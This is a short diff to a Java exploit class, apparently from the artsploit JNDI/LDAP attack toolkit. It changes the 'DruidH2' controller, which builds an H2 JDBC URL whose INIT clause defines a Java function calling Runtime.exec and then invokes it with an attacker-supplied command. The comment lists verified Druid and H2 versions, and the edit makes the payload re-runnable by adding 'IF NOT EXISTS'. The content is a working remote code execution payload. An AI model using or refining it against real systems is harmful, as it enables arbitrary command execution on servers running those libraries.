@@ -20,10 +20,10 @@ import static artsploit.Utilities.serialize;
  * Utilizing the CREATE ALIAS command, one can establish a function that embeds a Java payload, which can then be invoked within an SQL query.
  * Therefore, by configuring a JDBC connection string for an H2 database to include an INIT parameter that directs to an
  * SQL statement featuring the CREATE ALIAS command followed by a CALL command, arbitrary Java code can be executed.
- *
+
  * Requires:
  *  Druid and H2 in classpath
- *
+
  *  Verified On:
  *  - com.alibaba:druid:1.0.15
  *  - com.h2database:h2:2.1.214
@@ -55,7 +55,7 @@ public class DruidH2 implements LdapController {
                 javascript + " $$";
         */
 
-        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS " +
+        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS IF NOT EXISTS EXEC AS " +
                 "'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;" +
                 "return \"test\"\\;}'\\;CALL EXEC('" + Config.command + "')";
 
